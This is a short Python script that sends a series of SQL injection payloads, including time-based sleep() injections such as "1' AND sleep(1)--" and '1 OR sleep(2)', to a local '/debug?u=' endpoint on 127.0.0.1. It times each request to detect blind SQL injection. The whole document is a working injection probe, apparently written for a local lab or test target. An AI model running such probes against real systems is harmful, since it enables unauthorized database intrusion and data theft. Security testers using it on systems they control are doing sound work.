import urllib.request, urllib.parse, time
B="http://127.0.0.1:8897/debug?u="
def t(c,n=3):
    ts=[]
    for _ in range(n):
        s=time.time()
        try:
            urllib.request.urlopen(B+urllib.parse.quote(c),timeout=30).read()
        except urllib.error.HTTPError as e: e.read()
        ts.append(round(time.time()-s,3))
    print(ts, repr(c)[:40], flush=True)
for c in ["1","1'","1 AND sleep(1)","1' AND sleep(1)--","1' AND sleep(1) AND '1'='1","1' AND 1=(SELECT 1)--","1 OR sleep(2)"]:
    t(c)
